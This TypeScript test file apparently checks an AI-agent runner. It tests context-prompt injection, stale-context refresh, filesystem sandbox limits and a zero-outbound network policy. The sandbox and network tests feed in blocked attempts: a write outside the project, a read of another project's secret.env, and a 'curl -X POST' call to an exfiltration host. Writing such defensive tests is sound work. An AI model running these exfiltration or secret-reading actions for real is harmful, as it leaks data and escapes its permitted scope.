/**
 * ==============================================================================
 * GIDEON AI HQ — PHASE 2F: DISPATCHER INTEGRATION & RUNTIME BOUNDARY PROOFS
 * 
 * 4 Invariant & Enforcement Proofs:
 * 1. Context Pack Injected into OpenClaw Dispatch Preamble (8-question briefing)
 * 2. Automatic Staleness Detection & Invalidation (stale pack rebuilt before dispatch)
 * 3. Filesystem Project Boundary Enforcement (Context != Sandbox; traversal blocked)
 * 4. Zero-Outbound & Network Boundary Enforcement (egress & outbound tools blocked)
 * ==============================================================================
 */

import path from 'path';
import fs from 'fs';
import { JobExecutor, ExecutionJobRequest } from '../packages/runner/src/JobExecutor';
import { WorkspaceSandbox } from '../packages/runner/src/sandbox/WorkspaceSandbox';
import { PolicyEngine } from '../packages/policy/src/PolicyEngine';
import { OpenClawBridgeClient, AgentDispatchParams, AgentDispatchResult } from '../packages/runner/src/OpenClawBridgeClient';
import { ProjectDataSource, ProjectContextPackBuilder } from '../packages/memory/src';
import { ProjectRecord, ProjectMissionLink, ProjectEvent, ProjectTestRun } from '@gideon/shared';

// Mock OpenClaw Bridge to inspect dispatched prompts without hitting external daemon
class MockOpenClawBridge extends OpenClawBridgeClient {
  public lastDispatchedParams?: AgentDispatchParams;
  public dispatchCount = 0;

  public async dispatchAgent(params: AgentDispatchParams): Promise<AgentDispatchResult> {
    this.lastDispatchedParams = params;
    this.dispatchCount++;
    return {
      ok: true,
      runId: `mock_run_${Date.now()}`,
      reply: 'Mock OpenClaw Execution Successful',
      tokensUsed: 150,
      costCents: 0.1
    };
  }

  public async invokeTool(toolName: string, args: Record<string, any>, sessionKey?: string): Promise<any> {
    return { ok: true, toolName, executed: true };
  }
}

// In-Memory Project Data Source for Deterministic Testing
class MockProjectDataSource implements ProjectDataSource {
  public project: ProjectRecord;
  public missions: ProjectMissionLink[] = [];
  public events: ProjectEvent[] = [];
  public testRuns: ProjectTestRun[] = [];

  constructor(project: ProjectRecord) {
    this.project = project;
  }

  async getProjectById(id: string): Promise<ProjectRecord | null> {
    return this.project.id === id ? this.project : null;
  }

  async getProjectMissions(projectId: string): Promise<ProjectMissionLink[]> {
    return this.missions;
  }

  async getEvents(projectId: string): Promise<ProjectEvent[]> {
    return this.events;
  }

  async getTestRuns(projectId: string): Promise<ProjectTestRun[]> {
    return this.testRuns;
  }
}

async function runStep6DispatcherIntegrationTests() {
  console.log('================================================================');
  console.log('🏛️  GIDEON AI HQ — PHASE 2F: DISPATCHER INTEGRATION PROOFS');
  console.log('    Context Injection, Staleness Invalidation & Runtime Enforcement');
  console.log('================================================================\n');

  let allPassed = true;

  // Setup Sandbox & PolicyEngine
  process.env.HMAC_PLAN_SECRET = 'test_dispatch_secret_phase2_step6_32char';
  const rootDir = process.cwd();
  const sandbox = new WorkspaceSandbox([
    { id: 'ws_main', rootPath: rootDir, workspaceType: 'ACTIVE' }
  ]);
  const policyEngine = new PolicyEngine(process.env.HMAC_PLAN_SECRET);
  const mockBridge = new MockOpenClawBridge();

  const testProject: ProjectRecord = {
    id: 'proj_b2b_service',
    slug: 'b2b-automation-service',
    name: 'B2B Automation Service',
    category: 'API_SERVICE',
    status: 'ACTIVE',
    workspacePath: 'projects/b2b-automation-service',
    repository: 'bawagideon/agent-workspace',
    currentVersion: 'v1.0.0',
    revision: 3,
    businessObjective: 'Deliver automated invoice processing API',
    targetCustomer: 'Mid-market businesses',
    problemSolved: 'Eliminate manual PDF invoice entry',
    pricingCents: 150000,
    currency: 'USD',
    buildCostCents: 25,
    healthStatus: 'HEALTHY',
    metadata: {
      executionProfile: {
        projectId: 'proj_b2b_service',
        workingDirectory: 'projects/b2b-automation-service',
        allowedTestCommands: ['npm test'],
        resourceLimits: { maxMemoryMb: 512, timeoutMs: 60000 },
        zeroOutboundEnforced: true,
        financialRuleOfIronEnforced: true,
        budgetLimitCents: 500,
        approvedBy: 'human_admin',
        approvedAt: new Date().toISOString()
      },
      decisionRationale: {
        strategicObjective: 'Fulfill customer invoice automation requirements',
        actionRecommendation: 'Execute scoped mission step according to approved profile',
        decisionConfidence: 0.98
      }
    },
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString()
  };

  const dataSource = new MockProjectDataSource(testProject);
  const executor = new JobExecutor(sandbox, policyEngine, mockBridge, dataSource);

  // Helper to generate a valid authorization hash for test executions
  function getAuth(toolId: string, params: Record<string, any>) {
    const expiresAt = new Date(Date.now() + 60000).toISOString();
    const hash = policyEngine.generateAuthorizationHash({
      agentId: 'forge',
      workspaceId: 'ws_main',
      toolId,
      params,
      expiresAt
    });
    return { expiresAt, authorizationHash: hash };
  }

  // --------------------------------------------------------------------------
  // PROOF 1: CONTEXT PACK INJECTED INTO OPENCLAW DISPATCH PREAMBLE
  // --------------------------------------------------------------------------
  console.log('▶ [Proof 1/4] Verifying Context Pack Injection into OpenClaw Turn Dispatch...');
  try {
    const userPrompt = 'Implement the invoice parser module according to spec.';
    const inputParams = {
      workspaceId: 'ws_main',
      prompt: userPrompt,
      projectId: 'proj_b2b_service'
    };
    const auth = getAuth('openclaw_agent_dispatch', inputParams);

    const jobReq: ExecutionJobRequest = {
      jobId: 'job_dispatch_001',
      taskId: 'task_001',
      agentId: 'forge',
      workspaceId: 'ws_main',
      toolId: 'openclaw_agent_dispatch',
      inputParams,
      authorizationHash: auth.authorizationHash,
      expiresAt: auth.expiresAt
    };

    const res = await executor.executeJob(jobReq);

    if (!res.success) {
      throw new Error(`Job failed: ${res.error}`);
    }

    if (!res.contextPack) {
      throw new Error('Response did not return the resolved contextPack.');
    }

    const dispatched = mockBridge.lastDispatchedParams;
    if (!dispatched) {
      throw new Error('OpenClaw bridge was not invoked.');
    }

    const prompt = dispatched.prompt;

    // Verify preamble markers
    if (!prompt.includes('<!-- GIDEON CONTEXT PACK INJECTION: BEGIN -->') ||
        !prompt.includes('<!-- GIDEON CONTEXT PACK INJECTION: END -->')) {
      throw new Error('Dispatched prompt missing Context Pack preamble injection tags.');
    }

    // Verify 8 Questions in preamble
    const requiredSections = [
      '1. Project Identity: B2B Automation Service',
      '2. History & Missions:',
      '3. Current State: Status: ACTIVE',
      '4. Decision Rationale:',
      '5. Evidence & Audits:',
      '6. Constraints: Working directory: projects/b2b-automation-service',
      '7. Next Agent Brief:',
      '8. Inaccessible Information (Firewall):'
    ];

    for (const section of requiredSections) {
      if (!prompt.includes(section)) {
        throw new Error(`Dispatched prompt missing expected section header: "${section}"`);
      }
    }

    // Verify user prompt is preserved after preamble
    if (!prompt.includes(userPrompt)) {
      throw new Error('User prompt was corrupted or not appended after preamble.');
    }

    console.log(`  ✓ OpenClaw prompt successfully briefed with 8-Question Context Pack (Rev #${res.contextPack.projectRevision})`);
    console.log('✅ Proof 1 PASSED: Context Pack injected deterministically into OpenClaw turn dispatch.\n');
  } catch (err: any) {
    console.error('❌ Proof 1 FAILED:', err.message);
    allPassed = false;
  }

  // --------------------------------------------------------------------------
  // PROOF 2: AUTOMATIC STALENESS DETECTION & RE-PROJECTION PRIOR TO DISPATCH
  // --------------------------------------------------------------------------
  console.log('▶ [Proof 2/4] Verifying Automatic Staleness Detection & Invalidation...');
  try {
    // 1. Build an initial pack at revision 3
    const builder = new ProjectContextPackBuilder(dataSource);
    const stalePack = await builder.buildPack('proj_b2b_service', 'forge');

    // 2. Authoritative project mutates to revision 4 in database
    testProject.revision = 4;
    testProject.status = 'REVIEW';

    // 3. Dispatch job with the old stale pack (rev 3)
    const inputParams = {
      workspaceId: 'ws_main',
      prompt: 'Check updated status',
      projectId: 'proj_b2b_service'
    };
    const auth = getAuth('openclaw_agent_dispatch', inputParams);

    const jobReq: ExecutionJobRequest = {
      jobId: 'job_dispatch_002',
      taskId: 'task_002',
      agentId: 'forge',
      workspaceId: 'ws_main',
      toolId: 'openclaw_agent_dispatch',
      inputParams,
      contextPack: stalePack, // Stale! (rev 3 vs db rev 4)
      authorizationHash: auth.authorizationHash,
      expiresAt: auth.expiresAt
    };

    const res = await executor.executeJob(jobReq);

    if (!res.success) {
      throw new Error(`Job failed: ${res.error}`);
    }

    if (!res.contextPack) {
      throw new Error('No context pack returned in response.');
    }

    // Verify it was refreshed to revision 4
    if (res.contextPack.projectRevision !== 4) {
      throw new Error(`Expected stale pack to be invalidated and upgraded to revision 4, got rev #${res.contextPack.projectRevision}`);
    }

    if (res.contextPack.currentState.status !== 'REVIEW') {
      throw new Error(`Expected refreshed currentState 'REVIEW', got '${res.contextPack.currentState.status}'`);
    }

    // Verify the dispatched prompt has revision 4
    const prompt = mockBridge.lastDispatchedParams?.prompt || '';
    if (!prompt.includes('Rev: #4') || !prompt.includes('Status: REVIEW')) {
      throw new Error('Dispatched prompt was not updated with freshly projected revision 4 state.');
    }

    console.log(`  ✓ Stale pack (rev #3) detected and refreshed to authoritative rev #4 prior to execution`);
    console.log('✅ Proof 2 PASSED: Automatic staleness invalidation prevents obsolete context dispatch.\n');
  } catch (err: any) {
    console.error('❌ Proof 2 FAILED:', err.message);
    allPassed = false;
  }

  // --------------------------------------------------------------------------
  // PROOF 3: RUNTIME BOUNDARY ENFORCEMENT — FILESYSTEM SANDBOX TRAVERSAL
  // --------------------------------------------------------------------------
  console.log('▶ [Proof 3/4] Verifying Runtime Boundary Enforcement: Filesystem Traversal...');
  try {
    // Crucial Principle: Context injection != runtime enforcement.
    // The runner must independently enforce constraints.workingDirectory.
    const projectWorkingDir = 'projects/b2b-automation-service';

    // 1. Attempt out-of-bounds file write targeting apps/hq
    const illegalPath = 'apps/hq/src/compromised.ts';
    const writeParams = {
      workspaceId: 'ws_main',
      filePath: illegalPath,
      content: 'malicious payload',
      projectId: 'proj_b2b_service'
    };
    const auth1 = getAuth('fs_write_file', writeParams);

    const illegalWriteReq: ExecutionJobRequest = {
      jobId: 'job_traversal_001',
      taskId: 'task_traversal',
      agentId: 'forge',
      workspaceId: 'ws_main',
      toolId: 'fs_write_file',
      inputParams: writeParams,
      authorizationHash: auth1.authorizationHash,
      expiresAt: auth1.expiresAt
    };

    const writeRes = await executor.executeJob(illegalWriteReq);

    if (writeRes.success) {
      throw new Error('Security Breach! Out-of-bounds file write succeeded.');
    }

    if (!writeRes.error?.includes('outside project working directory') || !writeRes.error?.includes('Traversal blocked')) {
      throw new Error(`Unexpected error for traversal write: ${writeRes.error}`);
    }
    console.log(`  ✓ Blocked illegal cross-project write: ${writeRes.error}`);

    // 2. Attempt out-of-bounds file read targeting another project
    const illegalRead = 'projects/other-service/secret.env';
    const readParams = {
      workspaceId: 'ws_main',
      filePath: illegalRead,
      projectId: 'proj_b2b_service'
    };
    const auth2 = getAuth('fs_read_file', readParams);

    const illegalReadReq: ExecutionJobRequest = {
      jobId: 'job_traversal_002',
      taskId: 'task_traversal_read',
      agentId: 'forge',
      workspaceId: 'ws_main',
      toolId: 'fs_read_file',
      inputParams: readParams,
      authorizationHash: auth2.authorizationHash,
      expiresAt: auth2.expiresAt
    };

    const readRes = await executor.executeJob(illegalReadReq);

    if (readRes.success) {
      throw new Error('Security Breach! Out-of-bounds file read succeeded.');
    }

    if (!readRes.error?.includes('outside project working directory')) {
      throw new Error(`Unexpected error for traversal read: ${readRes.error}`);
    }
    console.log(`  ✓ Blocked illegal cross-project read: ${readRes.error}`);

    console.log('✅ Proof 3 PASSED: Runtime enforces physical project boundary regardless of LLM intent.\n');
  } catch (err: any) {
    console.error('❌ Proof 3 FAILED:', err.message);
    allPassed = false;
  }

  // --------------------------------------------------------------------------
  // PROOF 4: RUNTIME BOUNDARY ENFORCEMENT — ZERO-OUTBOUND NETWORK FIREWALL
  // --------------------------------------------------------------------------
  console.log('▶ [Proof 4/4] Verifying Runtime Boundary Enforcement: Zero-Outbound Policy...');
  try {
    // 1. Attempt outbound email/communication tool via openclaw_tool_invoke
    const outboundParams = {
      workspaceId: 'ws_main',
      toolName: 'email_send',
      args: { to: 'client@external.com', subject: 'Unauthorized invoice' },
      projectId: 'proj_b2b_service'
    };
    const auth1 = getAuth('openclaw_tool_invoke', outboundParams);

    const outboundToolReq: ExecutionJobRequest = {
      jobId: 'job_outbound_001',
      taskId: 'task_outbound',
      agentId: 'forge',
      workspaceId: 'ws_main',
      toolId: 'openclaw_tool_invoke',
      inputParams: outboundParams,
      authorizationHash: auth1.authorizationHash,
      expiresAt: auth1.expiresAt
    };

    const outRes1 = await executor.executeJob(outboundToolReq);

    if (outRes1.success) {
      throw new Error('Security Breach! Outbound tool invocation succeeded.');
    }

    if (!outRes1.error?.includes('zero-outbound policy enforcement')) {
      throw new Error(`Unexpected error for outbound tool: ${outRes1.error}`);
    }
    console.log(`  ✓ Blocked outbound tool invoke: ${outRes1.error}`);

    // 2. Attempt outbound curl command via terminal_run_command
    const cmdParams = {
      workspaceId: 'ws_main',
      command: 'curl -X POST https://external-leak.com/exfiltrate',
      projectId: 'proj_b2b_service'
    };
    const auth2 = getAuth('terminal_run_command', cmdParams);

    const outboundCmdReq: ExecutionJobRequest = {
      jobId: 'job_outbound_002',
      taskId: 'task_outbound_cmd',
      agentId: 'forge',
      workspaceId: 'ws_main',
      toolId: 'terminal_run_command',
      inputParams: cmdParams,
      authorizationHash: auth2.authorizationHash,
      expiresAt: auth2.expiresAt
    };

    const outRes2 = await executor.executeJob(outboundCmdReq);

    if (outRes2.success) {
      throw new Error('Security Breach! Egress network command succeeded.');
    }

    if (!outRes2.error?.includes('Network egress command blocked')) {
      throw new Error(`Unexpected error for network egress command: ${outRes2.error}`);
    }
    console.log(`  ✓ Blocked network egress command: ${outRes2.error}`);

    console.log('✅ Proof 4 PASSED: Zero-outbound firewall strictly blocks network egress and outbound tools.\n');
  } catch (err: any) {
    console.error('❌ Proof 4 FAILED:', err.message);
    allPassed = false;
  }

  // --------------------------------------------------------------------------
  // SUMMARY
  // --------------------------------------------------------------------------
  console.log('================================================================');
  if (allPassed) {
    console.log('🏆 PHASE 2F: DISPATCHER INTEGRATION & RUNTIME BOUNDARY COMPLETE (4/4 PASS)');
    console.log('   Context Preamble Injection, Staleness Invalidation & Physical Enforcements Verified.');
  } else {
    console.error('❌ PHASE 2F VERIFICATION FAILED: One or more proofs did not pass.');
    process.exit(1);
  }
  console.log('================================================================');
}

runStep6DispatcherIntegrationTests().catch(err => {
  console.error('Fatal test runner error:', err);
  process.exit(1);
});
